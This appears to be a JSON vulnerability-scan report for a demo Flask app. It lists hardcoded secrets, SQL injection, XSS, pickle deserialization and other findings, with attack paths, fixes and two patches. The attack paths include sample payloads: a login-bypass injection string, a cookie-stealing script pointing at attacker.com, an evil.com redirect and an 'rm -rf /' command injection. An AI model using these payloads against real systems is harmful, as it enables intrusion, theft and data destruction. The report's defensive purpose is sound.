@@ -1,0 +1,135 @@
+{
+  "scan_id": "cg-1716278400",
+  "project_path": "./demo/vulnerable_app",
+  "total_files_scanned": 1,
+  "vulnerabilities_found": 9,
+  "false_positives_filtered": 1,
+  "auto_fixed": 7,
+  "fix_acceptance_rate": "78%",
+  "critical": 2,
+  "high": 4,
+  "medium": 3,
+  "low": 0,
+  "scan_duration_seconds": 94.3,
+  "issues": [
+    {
+      "file": "demo/vulnerable_app/app.py",
+      "line": 16,
+      "type": "HARDCODED_SECRET",
+      "severity": "critical",
+      "cvss_score": 9.1,
+      "exploitability": "easy",
+      "attack_path": "Attacker reads source code or git history and extracts the SECRET_KEY, then forges session cookies or JWT tokens.",
+      "recommendation": "Load from environment variable: SECRET_KEY = os.environ.get('SECRET_KEY') and raise an error if not set.",
+      "code_snippet": "SECRET_KEY = \"super_secret_password_123\""
+    },
+    {
+      "file": "demo/vulnerable_app/app.py",
+      "line": 31,
+      "type": "SQL_INJECTION",
+      "severity": "critical",
+      "cvss_score": 9.8,
+      "exploitability": "easy",
+      "attack_path": "Attacker sends username=' OR '1'='1 to bypass authentication or extract all user records from the database.",
+      "recommendation": "Use parameterized queries: cursor.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, password))",
+      "code_snippet": "    query = \"SELECT * FROM users WHERE username = '%s' AND password = '%s'\" % (username, password)"
+    },
+    {
+      "file": "demo/vulnerable_app/app.py",
+      "line": 40,
+      "type": "TIMING_ATTACK",
+      "severity": "medium",
+      "cvss_score": 5.3,
+      "exploitability": "difficult",
+      "attack_path": "An attacker can use timing differences in string comparison to brute-force token values byte by byte.",
+      "recommendation": "Use hmac.compare_digest(token, user['token']) for constant-time comparison.",
+      "code_snippet": "        if token == user[\"token\"]:"
+    },
+    {
+      "file": "demo/vulnerable_app/app.py",
+      "line": 46,
+      "type": "XSS_FLASK",
+      "severity": "high",
+      "cvss_score": 7.4,
+      "exploitability": "easy",
+      "attack_path": "Attacker crafts URL with ?name=<script>document.cookie='attacker.com/?c='+document.cookie</script> and tricks victim into clicking it.",
+      "recommendation": "Use Flask's render_template with Jinja2 auto-escaping, or use markupsafe.escape(name).",
+      "code_snippet": "    return f\"<h1>Hello, {name}</h1>\""
+    },
+    {
+      "file": "demo/vulnerable_app/app.py",
+      "line": 52,
+      "type": "OPEN_REDIRECT",
+      "severity": "high",
+      "cvss_score": 6.1,
+      "exploitability": "easy",
+      "attack_path": "Attacker sends phishing link: /redirect?next=https://evil.com to redirect victims after login.",
+      "recommendation": "Validate redirect target against an allowlist of internal paths before redirecting.",
+      "code_snippet": "    return redirect(next_url)"
+    },
+    {
+      "file": "demo/vulnerable_app/app.py",
+      "line": 58,
+      "type": "PICKLE_DESERIALIZE",
+      "severity": "critical",
+      "cvss_score": 10.0,
+      "exploitability": "easy",
+      "attack_path": "Attacker crafts a malicious pickle payload that executes arbitrary OS commands when deserialized.",
+      "recommendation": "Never deserialize untrusted data with pickle. Use json.loads() or a safe schema-validated format.",
+      "code_snippet": "    obj = pickle.loads(bytes.fromhex(data))"
+    },
+    {
+      "file": "demo/vulnerable_app/app.py",
+      "line": 64,
+      "type": "INSECURE_RANDOM",
+      "severity": "medium",
+      "cvss_score": 5.0,
+      "exploitability": "moderate",
+      "attack_path": "random.randint is seeded by time; attacker can predict 6-digit tokens and use them for account takeover.",
+      "recommendation": "Use secrets.randbelow(900000) + 100000 for cryptographically secure token generation.",
+      "code_snippet": "    token = random.randint(100000, 999999)"
+    },
+    {
+      "file": "demo/vulnerable_app/app.py",
+      "line": 70,
+      "type": "WEAK_HASH",
+      "severity": "high",
+      "cvss_score": 7.5,
+      "exploitability": "easy",
+      "attack_path": "MD5 hashes are precomputed in rainbow tables; attacker with database access can reverse all password hashes instantly.",
+      "recommendation": "Use bcrypt or argon2: from argon2 import PasswordHasher; ph = PasswordHasher(); ph.hash(pw)",
+      "code_snippet": "    return hashlib.md5(pw.encode()).hexdigest()"
+    },
+    {
+      "file": "demo/vulnerable_app/app.py",
+      "line": 76,
+      "type": "COMMAND_INJECTION",
+      "severity": "critical",
+      "cvss_score": 10.0,
+      "exploitability": "easy",
+      "attack_path": "Attacker calls /run?cmd=rm+-rf+/ or any shell command, achieving full remote code execution.",
+      "recommendation": "Remove this endpoint entirely. If needed, use subprocess with a fixed command list and no shell=True.",
+      "code_snippet": "    result = os.system(cmd)"
+    }
+  ],
+  "patches": [
+    {
+      "file": "demo/vulnerable_app/app.py",
+      "line": 16,
+      "type": "HARDCODED_SECRET",
+      "original": "SECRET_KEY = \"super_secret_password_123\"",
+      "patched": "SECRET_KEY = os.environ.get('SECRET_KEY') or (_ for _ in ()).throw(ValueError('SECRET_KEY not set'))",
+      "explanation": "Load secret from environment variable instead of hardcoding.",
+      "applied": true
+    },
+    {
+      "file": "demo/vulnerable_app/app.py",
+      "line": 31,
+      "type": "SQL_INJECTION",
+      "original": "    query = \"SELECT * FROM users WHERE username = '%s' AND password = '%s'\" % (username, password)",
+      "patched": "    cursor.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, password))",
+      "explanation": "Replaced string formatting with parameterized query.",
+      "applied": true
+    }
+  ]
+}
